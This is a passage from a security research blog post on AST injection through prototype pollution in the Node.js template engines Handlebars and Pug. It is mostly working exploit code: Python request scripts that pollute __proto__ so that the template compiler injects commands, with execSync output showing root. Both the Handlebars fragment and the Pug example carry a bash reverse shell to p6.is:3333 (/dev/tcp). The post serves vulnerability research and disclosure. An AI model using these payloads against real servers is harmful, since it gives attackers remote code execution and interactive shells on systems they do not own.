class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1&#x27;`)&quot;</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;end&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_1.png" alt="img"></p><p>We can Insert the any command into the value to obtain the shell.</p><h2 id="Pug"><a href="#Pug" class="headerlink" title="Pug"></a>Pug</h2><p><img src="/img/2020/08/graph_7.png" alt="img"></p><p>Until today, this <code>pug</code> has been downloaded a total of <code>65,827,719</code> times.</p><p><code>pug</code> is a module that was previously developed under the name jade and renamed.<br>According to statistics, it is the 4th most popular template engine in nodejs.</p><h3 id="How-to-Detect-1"><a href="#How-to-Detect-1" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &lt;h1&gt;It works&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>A common way to use a template in a pug is as above.<br>The pug.compile function converts a string into a template function and passes the object for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Text&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>It is a method to check the use of pug template engine in a black-box environment using prototype pollution.<br>When you insert AST into the <code>Object.prototype.block</code>, the compiler adds it to the buffer by referring to the val.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (ast.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;NamedBlock&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Block&#x27;</span>:</span><br><span class="line">        ast.<span class="property">nodes</span> = <span class="title function_">walkAndMergeNodes</span>(ast.<span class="property">nodes</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Case&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Filter&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Mixin&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Tag&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;InterpolatedTag&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;When&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Code&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;While&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (ast.<span class="property">block</span>) &#123;</span><br><span class="line">        ast.<span class="property">block</span> = <span class="title function_">walkAST</span>(ast.<span class="property">block</span>, before, after, options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>When ast.type is <code>While</code>, it calls walkASK with <code>ast.block</code> (refers prototype if the value does not exist)<br>If the template refer any value from argument, the While node is always exists, so the reliblity is considered quite high.</p><p>In fact, if developer don’t have to refer to any values from argument in the template<br>they wouldn’t use any template engines in the first place.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_8.jpg" alt="img"></p><p><code>Pug</code> work as shown in the graph above.<br>Unlike <code>handlebars</code>, each process is separated into a separate module.<br>AST generated by <code>pug-parser</code> is passed to the <code>pug-code-gen</code> and made into a function.<br>and finally, it will be executed.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>pug-code-gen/index.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug &amp;&amp; node.<span class="property">debug</span> !== <span class="literal">false</span> &amp;&amp; node.<span class="property">type</span> !== <span class="string">&#x27;Block&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">line</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> js = <span class="string">&#x27;;pug_debug_line = &#x27;</span> + node.<span class="property">line</span>;</span><br><span class="line">        <span class="keyword">if</span> (node.<span class="property">filename</span>)</span><br><span class="line">            js += <span class="string">&#x27;;pug_debug_filename = &#x27;</span> + <span class="title function_">stringify</span>(node.<span class="property">filename</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(js + <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the compiler of the pug, there is a variable that stores the line number named <code>pug_debug_line</code> for debugging.<br>If the node.line value exists, it is added to the buffer, otherwise it is passed.</p><p>For AST generated with pug-parser, the <code>node.line</code> value is always specified as an integer.<br>But, we can insert a string into the <code>node.line</code> through AST Injection and cause arbitrary code execution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, <span class="string">&quot;line&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source, &#123;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function template(locals) &#123;</span></span><br><span class="line"><span class="comment">    var pug_html = &quot;&quot;,</span></span><br><span class="line"><span class="comment">        pug_mixins = &#123;&#125;,</span></span><br><span class="line"><span class="comment">        pug_interp;</span></span><br><span class="line"><span class="comment">    var pug_debug_filename, pug_debug_line;</span></span><br><span class="line"><span class="comment">    try &#123;;</span></span><br><span class="line"><span class="comment">        var locals_for_with = (locals || &#123;&#125;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        (function (console, msg, process) &#123;;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + &quot;\u003Ch1\u003E&quot;;;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp));;</span></span><br><span class="line"><span class="comment">            pug_debug_line = console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString());</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + &quot;ndefine\u003C\u002Fh1\u003E&quot;;</span></span><br><span class="line"><span class="comment">        &#125;.call(this, &quot;console&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.console :</span></span><br><span class="line"><span class="comment">            typeof console !== &#x27;undefined&#x27; ? console : undefined, &quot;msg&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.msg :</span></span><br><span class="line"><span class="comment">            typeof msg !== &#x27;undefined&#x27; ? msg : undefined, &quot;process&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.process :</span></span><br><span class="line"><span class="comment">            typeof process !== &#x27;undefined&#x27; ? process : undefined));;</span></span><br><span class="line"><span class="comment">    &#125; catch (err) &#123;</span></span><br><span class="line"><span class="comment">        pug.rethrow(err, pug_debug_filename, pug_debug_line);</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    return pug_html;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Example of a generated function.<br>You can see that the <code>Object.prototype.line</code> value is inserted in the right-hand side of the <code>pug_debug_line</code> definition.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, <span class="string">&quot;line&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &quot;uid=0(root) gid=0(root) groups=0(root)\n\n&lt;h1&gt;It worksndefine&lt;/h1&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>By specifying a string in the <code>node.line</code> value, which is always defined as number through parser.<br>So, any command could be inserted into the function.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> template = pug.<span class="title function_">compile</span>(<span class="string">`h1= msg`</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="title function_">template</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vulnerable&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> object = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    res.<span class="title function_">json</span>(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>As in the example of handlebars, flat used to configure the server.<br>The template engine has been changed to <code>pug</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&#x27;http://p6.is:3000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">&#x27;/vulnerable&#x27;</span>, json = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__.block&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, </span><br><span class="line">        <span class="string">&quot;line&quot;</span>: <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1&#x27;`)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_2.png" alt="img"></p><p>We can insert any code into the <code>block.line</code>, and get a shell.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I described how to make arbitrary command execution,<br>through AST Injection on the JS template engines.</p><p>In fact, these parts are very hard to fix completely<br>So I expect this to remain like EJS.</p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AST-Injection"><span class="toc-number">1.</span> <span class="toc-text">AST Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-AST"><span class="toc-number">1.1.</span> <span class="toc-text">What is AST?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST-in-NodeJS"><span class="toc-number">1.2.</span> <span class="toc-text">AST in NodeJS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Handlebars"><span class="toc-number">2.</span> <span class="toc-text">Handlebars</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-Detect"><span class="toc-number">2.1.</span> <span class="toc-text">How to Detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">2.3.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pug"><span class="toc-number">3.</span> <span class="toc-text">Pug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-Detect-1"><span class="toc-number">3.1.</span> <span class="toc-text">How to Detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-number">3.3.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/AST-Injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/AST-Injection/&text=AST Injection, Prototype Pollution to RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>